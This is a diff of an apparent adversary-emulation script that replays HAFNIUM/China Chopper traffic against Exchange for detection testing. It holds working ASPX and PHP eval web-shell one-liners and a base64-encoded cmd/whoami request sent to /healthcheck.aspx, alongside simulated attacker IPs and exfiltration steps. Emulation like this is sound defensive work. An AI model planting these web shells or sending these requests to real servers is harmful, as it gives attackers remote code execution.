@@ -3,11 +3,14 @@ reference "https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-
 reference "https://en.wikipedia.org/wiki/China_Chopper"
 reference "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-china-chopper.pdf"
 reference "https://blog.talosintelligence.com/2021/03/hafnium-update.html"
+# About User-Agents:
+reference "https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/"
 revision 1
 
 # A Random IP from the dmoains given in the list
-$attacker_ip = "203.99.24.214"
-$ip-dst = $attacker_ip
+# $attacker_ip = "203.99.24.214"
+$rand-ip = random.int(1, 17)
+$ip-dst = csv("attacker.csv", $rand-ip, "ip", true)
 $ip-src = "172.16.0.23"
 $aspx_webshell = """<%@ Page Language="Jscript"%><%eval(Request.Item["Security"],"unsafe");%>"""
 $php_webshell = """<?php @eval($_POST['password']);?>"""
@@ -22,27 +25,9 @@ $file_sharing_ip = "89.44.169.139"
 
 $agent-id = uuid.v4(" ")
 
+$randomain = random.int(1,3)
+$domain = csv("domainname.csv", $randomain, "Indicator", true)
 
-$domain = "brian.krebsonsecurity.top"
-
-action dns {
-    exec DNSConnection
-}
-
-# Exchange Servers are controlled by China Chopper programmed in JScript
-# POST requests to the .aspx script executing code with JScript 'eval' function
-action http {
-    $resp-content = $aspx_webshell
-    $client-content = ""
-    $uri = "/healthcheck.aspx"
-
-    $resp-content-type = "application/javascript"
-    $resp-content = $aspx_webshell
-    
-    exec HTTPConnection
-}
-
-sleep 120
 
 action newprocess-procdump {
     $log_plugin = "mswin-security"
@@ -136,16 +121,56 @@ action megaxfer {
 
 sleep 100
 
+action dns {
+    exec DNSConnection
+}
+
+
 repeat 100 as $index {
     $data = base64url.encode(random.string(random.int(42,82)))
     
     action http {
 	$method = "POST"
 	$client-content = $data
+	$rand-useragent = random.int(1,5)
+	$user-agent = csv("post-ua.csv", $rand-useragent, "ua", true)
 	# $uri = "/healthcheck.aspx&z1=Y21k&z2=Y2QgL2QgImM6XGluZXRwdWJcd3d3cm9vdFwiJndob2FtaSZlY2hvIFtTXSZjZCZlY2hvIFtFXQ%3D%3D"
 	$uri = "/healthcheck.aspx&z1=Y21k&z2=${data}%3D%3D"
 	
 	exec HTTPConnection
     }
+}
+
+
+sleep 120
+
+# Exchange Servers are controlled by China Chopper programmed in JScript
+# POST requests to the .aspx script executing code with JScript 'eval' function
+action http {
+    $resp-content = $aspx_webshell
+    # $client-content = ""
+    $uri = "/healthcheck.aspx"
+
+    $resp-content-type = "application/javascript"
+    $resp-content = $aspx_webshell
+
+    exec HTTPConnection
+}
+
+sleep random.int(140, 800)
+
+action http-ecp {
+    $resp-content = $aspx_webshell
+    # $client-content = ""
+    $uri = "/ecp/default.flt"
+
+    $resp-content-type = "application/javascript"
+    $resp-content = $aspx_webshell
+
+    $rand-useragent = random.int(1,3)
+    $user-agent = csv("ecp-ua.csv", $rand-useragent, "ua", true)
+
+    
+    exec HTTPConnection
 }
 
